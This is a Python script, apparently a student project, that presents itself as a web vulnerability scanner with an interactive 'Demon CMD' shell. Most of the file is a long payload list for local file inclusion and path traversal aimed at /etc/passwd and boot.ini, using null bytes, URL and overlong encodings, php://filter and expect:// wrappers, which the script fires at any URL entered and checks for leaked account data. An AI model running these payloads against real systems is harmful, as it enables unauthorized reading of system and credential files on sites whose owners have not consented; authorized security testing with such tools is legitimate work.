#!/usr/bin/env python3
# Author - comandre-ex - IRVING ST
# Este proyecto fue creado para el análisis de vulnerabilidades web, Creado por un estudiante de la escuela CETIS50.

from colorama import Fore, Style
from pwn import *
import time, sys, signal, string, requests, cmd
import mitmproxy.http
from bs4 import BeautifulSoup


def def_handler(sig, frame):
    log.failure(Fore.RED + Style.BRIGHT + "Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


#  Payloads...
local_file_inclusion = [             
        "/etc/passwd%2500", "/etc/passwd%00", "/etc/passwd", "///etc///passwd%2500", "///etc///passwd%00", "///etc///passwd", "../etc/passwd%2500", "../etc/passwd%00", "../etc/passwd", "..///etc///passwd%2500", "..///etc///passwd%00", "..///etc///passwd", "..///..///etc///passwd%2500", "..///..///etc///passwd%00", "..///..///etc///passwd", "..///..///..///etc///passwd%2500", "..///..///..///etc///passwd%00", "..///..///..///etc///passwd", "..///..///..///..///etc///passwd%2500", "..///..///..///..///etc///passwd%00", "..///..///..///..///etc///passwd", "..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///etc///passwd", "..///..///..///..///..///..///..///etc///passwd%2500", "..///..///..///..///..///..///..///etc///passwd%00", "..///..///..///..///..///..///..///etc///passwd", "../../etc/passwd%2500", "../../etc/passwd%00", "../../etc/passwd", "../../../etc/passwd%2500", "../../../etc/passwd%00", "../../../etc/passwd", "../../../../etc/passwd%2500", "../../../../etc/passwd%00", "../../../../etc/passwd", "../../../../../../etc/passwd%2500", "../../../../../../etc/passwd%00", "../../../../../../etc/passwd", "../../../../../etc/passwd%00", "../../../../../etc/passwd", "../../../../../../../etc/passwd%2500", "../../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd", "../../../../../../../../etc/passwd%2500", "../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd", "\etc\passwd%2500", "\etc\passwd%00", "\etc\passwd", "..\etc\passwd%2500", "..\etc\passwd%00", "..\etc\passwd", "..\..\etc\passwd%2500", "..\..\etc\passwd%00", "..\..\etc\passwd", "..\..\..\etc\passwd%2500", "..\..\..\etc\passwd%00", "..\..\..\etc\passwd", "..\..\..\..\etc\passwd%2500", "..\..\..\..\etc\passwd%00", "..\..\..\..\etc\passwd", "..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\etc\passwd", "..\..\..\..\..\..\etc\passwd%2500", "..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\etc\passwd", "%00../../../../../../etc/passwd", "%00/etc/passwd%00", "%0a/bin/cat%20/etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "\'/bin/cat%20/etc/passwd\'", "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd", "/etc/default/passwd","././././././././././././etc/passwd",".//.//.//.//.//.//.//.//.//.//.//.//etc//passwd", "/./././././././././././etc/passwd", "/../../../../../../../../../../etc/passwd", "/../../../../../../../../../../etc/passwd^^", "/../../../../../../../etc/passwd", "/etc/passwd", "../../../../../../../../../../../../etc/passwd", "../../../../../../../../etc/passwd", "../../../../../../../etc/passwd", "../../../../../../etc/passwd", "../../../../../etc/passwd","../../../../etc/passwd" , "../../../etc/passwd" , "../../etc/passwd" , "../etc/passwd", "../../../../../../../../../../../etc/passwd" , ".\./.\./.\./.\./.\./.\./etc/passwd","\..\..\..\..\..\..\..\..\etc\passwd","etc/passwd", "/etc/passwd%00", "../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00", "../../../../../../../../../../etc/passwd%00", "../../../../../../../../../etc/passwd%00", "../../../../../../../../etc/passwd%00", "../../../../../../../etc/passwd%00", "../../../../../../etc/passwd%00", "../../../../../etc/passwd%00", "../../../../etc/passwd%00", "../../../etc/passwd%00","../../etc/passwd%00", "../etc/passwd%00", "\..\..\..\..\..\..\..\..\etc\passwd%00", "..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "../..\..\..\..\..\..\..\..\..\..\etc\passwd%00", "/../../../../../../../../../../../etc/passwd%00.html", "/../../../../../../../../../../../etc/passwd%00.jpg", "../../../../../../etc/passwd&=%3C%3C%3C%3C", "..2fetc2fpasswd", "..2fetc2fpasswd%00", "..2f..2fetc2fpasswd", "..2f..2fetc2fpasswd%00", "..2f..2f..2fetc2fpasswd", "..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd", "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00", "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%255cboot.ini", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini", "../..\../..\../..\../..\../..\../boot.ini", "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../../etc/passwd", "expect://ls"
        ]


class ExploitingDate(cmd.Cmd):
    prompt = "(Demon CMD) "
    url = ''
    type_vulnerability = ''
    vulnerability_types = ['lfi', 'sqli', 'xss']

    def do_set(self, arg):
        args = arg.split()
        if len(args) != 1:
            print('Error: set requires one argument (type of vulnerability)')
            return
        vuln_type = args[0]
        if vuln_type == 'lfi':
            self.type_vulnerability = 'lfi'
            print('Type of vulnerability set to LFI')
        else:
            print(f'Error: invalid type of vulnerability {vuln_type}')
        # solicitar la URL
        self.url = input('Enter the URL to scan: ')

    def do_show(self, arg):
        if arg == 'options':
            print('type_vulnerability')
        elif arg == 'values':
            print(f'type_vulnerability: {self.type_vulnerability}')
        else:
            print(f'Error: invalid argument {arg}')

    def do_exit(self, arg):
        return True

    def help(self):
        print('Available vulnerabilities: %s' % ', '.join(self.vulnerability_types))
        print('Required data:')
        print(' - url: URL of the website to scan')
        print(' - type_vulnerability: Type of vulnerability to scan')

    
    # Functions escaning
    def local_file_inclusionScanning(self):
        p2 = log.progress(Fore.WHITE + Style.BRIGHT + "Payload  Injectado  :")
        for Payloads in local_file_inclusion:
            main_url = self.url + Payloads
            response = requests.get(main_url)
            p2.status(Fore.WHITE + "%s" % Payloads)

            if "root" in response.text or "www-data" in response.text or "/usr/bin/zsh" in response.text or "/usr/bin/bash" in response.text:
                log.failure(Fore.WHITE + "Servidor vulnerable a Local file inclusion y path traversal.  Payload  Injectado: %s  " % Payloads)
            else:
                pass
    def run(self):
        if self.type_vulnerability == 'lfi':
            self.local_file_inclusionScanning()
    
    def do_run(self, arg):
        self.run()



if __name__ == '__main__':
    ExploitingDate().cmdloop()

